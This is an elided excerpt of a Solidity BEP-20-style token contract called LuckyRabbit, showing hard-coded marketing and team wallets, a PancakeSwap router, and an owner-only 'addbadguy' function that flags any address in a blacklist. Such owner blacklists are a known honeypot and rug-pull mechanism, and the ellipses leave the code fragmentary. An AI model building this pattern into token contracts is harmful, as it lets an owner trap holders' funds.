...
contract LuckyRabbit is Context, IERC20, Ownable {
    ...
    PancakeRouter private pancakeswap;
    address payable public marketingWallet= payable(address(0xa7fB30D92006863a9902E24b2e7CeDfCFade0cE5));
    address payable public teamWallet = payable(address(0xEdd933d328504194372b843f09BCaf7AA8eE4d1b));
    ...
    constructor(
        ...
        pancakeswap = PancakeRouter(PancakeRouterAddress);
    ...
    function transferFrom(
        ...
        function addbadguy(address add, bool isbadguy) external onlyOwner {
        _isbadguy[add] = isbadguy;
    }
